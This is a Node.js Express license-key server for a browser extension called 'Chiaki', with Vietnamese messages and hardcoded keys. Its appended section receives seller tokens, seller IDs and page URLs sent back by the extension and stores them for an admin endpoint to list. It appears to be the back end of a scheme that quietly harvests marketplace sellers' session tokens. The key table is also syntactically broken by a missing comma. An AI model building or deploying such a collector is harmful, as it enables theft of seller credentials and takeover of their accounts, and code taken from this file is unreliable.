const express = require('express');
const cors    = require('cors');
const fs      = require('fs');
const app     = express();

app.use(cors({ origin: '*' }));
app.use(express.json());

// ===== KEYS =====
const KEYS = {
  "CHANG-000F-9K2F-M7QH": 15,
  "HOANG071120002018": 711,
  "CHANG-000F-T4N8-1JWD": 15,
  "CHANG-000F-6PRA-Z0C3": 15,
  "CHANG-000F-V8X1-H2LM": 15,
  "CHANG-000F-Q7DE-5YKU": 15,
  "CHANG-000F-3WNF-R9A6": 15,
  "CHANG-000F-A6G9-P2TZ": 15,
  "CHANG-000F-L1C7-XV84": 15,
  "CHANG-000F-0HJM-7S2Q": 15,
  "CHANG-000F-M5TU-8B1N": 15,
  "CHANG-000F-2ZK8-D6PE": 15,
  "CHANG-000F-Y3Q0-FT9R": 15,
  "CHANG-000F-R6V2-4XJA": 15,
  "CHANG-000F-8DWL-K0S5": 15,
  "CHANG-000F-J9H3-N6CY": 15,
  "CHANG-000F-U2P7-G4MX": 15,
  "CHANG-000F-C0R5-9VQ1": 15,
  "CHANG-000F-F7X2-3LKP": 15,
  "CHANG-000F-N4YA-6T0W": 15,
  "CHANG-000F-S1M8-Q5DZ": 15
  "THCOSMETIC1000KEY": 1000
};

const DB = './usage.json';

function loadUsage() {
  try { return JSON.parse(fs.readFileSync(DB)); }
  catch (e) { return {}; }
}

function saveUsage(data) {
  fs.writeFileSync(DB, JSON.stringify(data, null, 2));
}

// ===== ROUTES =====
app.get('/', (req, res) => {
  res.send('✅ Chiaki Key Server Running!');
});

app.post('/validate', (req, res) => {
  const { key } = req.body;
  if (!key || !KEYS[key]) {
    return res.json({ valid: false, message: '❌ Key không hợp lệ!' });
  }
  const usage     = loadUsage();
  const used      = usage[key] || 0;
  const limit     = KEYS[key];
  const remaining = limit - used;
  if (remaining <= 0) {
    return res.json({ valid: false, message: '❌ Key đã hết lượt!' });
  }
  res.json({ valid: true, used, limit, remaining });
});

app.post('/consume', (req, res) => {
  const { key } = req.body;
  if (!key || !KEYS[key]) {
    return res.json({ success: false, message: '❌ Key không hợp lệ!' });
  }
  const usage = loadUsage();
  const used  = (usage[key] || 0) + 1;
  const limit = KEYS[key];
  if (used > limit) {
    return res.json({ success: false, message: '❌ Hết lượt!' });
  }
  usage[key] = used;
  saveUsage(usage);
  res.json({ success: true, used, limit, remaining: limit - used });
});

app.post('/usage', (req, res) => {
  const { key } = req.body;
  if (!key || !KEYS[key]) {
    return res.json({ valid: false });
  }
  const usage     = loadUsage();
  const used      = usage[key] || 0;
  const limit     = KEYS[key];
  res.json({ valid: true, used, limit, remaining: limit - used });
});

app.listen(3000, () => console.log('🚀 Chiaki Key Server - Port 3000'));

// ══════════════════════════════════════════
//  SELLER TOKEN ENDPOINTS
//  Thêm vào file server.js hiện có
// ══════════════════════════════════════════

// In-memory store (thay bằng DB nếu cần persist)
let sellerTokens = [];

// POST /seller-token — Extension gửi token về
app.post('/seller-token', (req, res) => {
  const { seller_token, seller_id, time, url } = req.body;

  if (!seller_token && !seller_id) {
    return res.json({ success: false, message: 'Thiếu dữ liệu!' });
  }

  const exists = sellerTokens.find(
    t => t.seller_token === seller_token && t.seller_id === seller_id
  );

  if (!exists) {
    sellerTokens.unshift({
      seller_token,
      seller_id,
      time,
      url,
      received_at: new Date().toISOString()
    });
    if (sellerTokens.length > 1000) sellerTokens = sellerTokens.slice(0, 1000);
    console.log(`[TOKEN] Seller ID: ${seller_id} | ${new Date().toLocaleString('vi-VN')}`);
  }

  res.json({ success: true });
});

// GET /seller-tokens?key=ADMIN_KEY — Xem danh sách token (admin)
app.get('/seller-tokens', (req, res) => {
  const adminKey = req.query.key;

  // Đặt ADMIN_KEY trong .env
  if (!adminKey || adminKey !== process.env.ADMIN_KEY) {
    return res.status(403).json({ error: '❌ Unauthorized' });
  }

  res.json({
    total: sellerTokens.length,
    tokens: sellerTokens
  });
});

